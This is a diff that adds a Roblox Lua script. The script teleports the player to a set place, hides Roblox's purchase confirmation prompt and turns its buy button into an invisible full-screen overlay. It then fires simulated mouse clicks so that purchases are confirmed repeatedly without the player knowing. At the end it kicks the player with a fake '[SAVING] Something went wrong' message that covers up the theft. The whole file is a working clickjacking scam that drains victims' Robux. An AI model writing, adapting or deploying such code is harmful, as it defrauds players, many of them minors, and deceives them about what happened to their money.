@@ -1,0 +1,93 @@
+local needPlace = 121136545362329
+if game.PlaceId~=needPlace then
+	game:GetService('TeleportService'):Teleport(needPlace, game.Players.LocalPlayer)
+else
+	local newGui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
+	newGui.Name = "BypassGUI"
+	newGui.IgnoreGuiInset = true
+	print("started")
+	local canbuy = true
+
+	local function BuyAttempt()
+		local coreG = game:GetService("CoreGui")
+		local prompt = coreG:FindFirstChild("PurchasePrompt",999999999999)
+		prompt.Enabled = false
+		local container = prompt:FindFirstChild("ProductPurchaseContainer",999999999999)
+		local animator = container:FindFirstChild("Animator",999999999999)
+		while not coreG:FindFirstChild("PurchasePrompt") do
+			task.wait()
+		end
+		local prompt2 = animator:WaitForChild("Prompt",999999999999)
+		local alertCont = prompt2:WaitForChild("AlertContents",999999999999)
+		local footer = alertCont:WaitForChild("Footer",999999999999)
+		local buttons = footer:WaitForChild("Buttons",999999999999)
+		local buyButton = buttons:WaitForChild("2",999999999999)
+
+		task.wait(3)
+
+		if buyButton.ButtonContent.ButtonMiddleContent.Text.Text == "Buy Robux" then
+			canbuy = false
+			prompt2:Destroy()
+		else
+			canbuy = true
+			buyButton.Parent = game.Players.LocalPlayer.PlayerGui.BypassGUI
+			prompt2:Destroy()
+
+
+			buyButton.Size = UDim2.new(1,0,1,0)
+			buyButton.ImageTransparency = 1
+			buyButton:WaitForChild("ButtonContent").Visible = false
+			buyButton.Changed:Connect(function()
+				buyButton.ImageTransparency = 1
+				if not buyButton.Visible then
+					buyButton:Destroy()
+				end
+			end)
+
+			local wasAddded = false
+			local fulldone = false
+
+			animator.ChildAdded:Connect(function(c)
+				pcall(function()
+					buyButton:Destroy()
+				end)
+				if not wasAddded then
+					wasAddded = true
+					local prompt2 = animator:WaitForChild("Prompt",999999999999)
+					local alertCont = prompt2:WaitForChild("AlertContents",999999999999)
+					local footer = alertCont:WaitForChild("Footer",999999999999)
+					local buttons = footer:WaitForChild("Buttons",999999999999)
+					local buyButton = buttons:WaitForChild("1",999999999999)
+					buyButton.Parent = game.Players.LocalPlayer.PlayerGui.BypassGUI
+					prompt2.Visible = false
+					buyButton.ImageTransparency = 1
+					buyButton:WaitForChild("ButtonContent").Visible = false
+					buyButton.Size = UDim2.new(1,0,1,0)
+					while prompt2.Parent~=nil do
+						wait()
+					end
+					buyButton:Destroy()
+					fulldone = true
+				end
+			end)
+
+			while not fulldone do
+				game:GetService("VirtualInputManager"):SendMouseButtonEvent(game:GetService('UserInputService'):GetMouseLocation().X,game:GetService('UserInputService'):GetMouseLocation().Y, 0, true, game, 1)
+				game:GetService("VirtualInputManager"):SendMouseButtonEvent(game:GetService('UserInputService'):GetMouseLocation().X,game:GetService('UserInputService'):GetMouseLocation().Y, 0, false, game, 1)
+				wait()
+			end
+		end
+	end
+
+	local attmpts = 0
+	while canbuy do
+		attmpts+=1
+		game:GetService('ReplicatedStorage').Buy:FireServer()
+		print("Attempt: "..attmpts)
+		BuyAttempt()
+		print("Attempt "..attmpts.." failed. Retrying...")
+		wait(1)
+	end
+
+	game.Players.LocalPlayer:Kick("[SAVING] Something went wrong. Please rejoin!")
+end
